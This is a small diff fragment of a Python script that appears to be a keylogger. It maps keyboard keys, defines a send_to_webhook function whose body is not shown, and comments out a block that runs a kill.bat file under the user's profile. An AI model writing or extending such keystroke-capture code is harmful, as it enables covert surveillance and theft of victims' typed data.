@@ -24,9 +24,11 @@ special_keys = {
     keyboard.Key.esc: "ESC",
 }
 
+'''
 username = os.getlogin()
 bat_file_path = f"C:\Users\{username}\kl2\kill.bat"
 subprocess.run([bat_file_path], shell=True)
+'''
 
 
 def send_to_webhook(message):
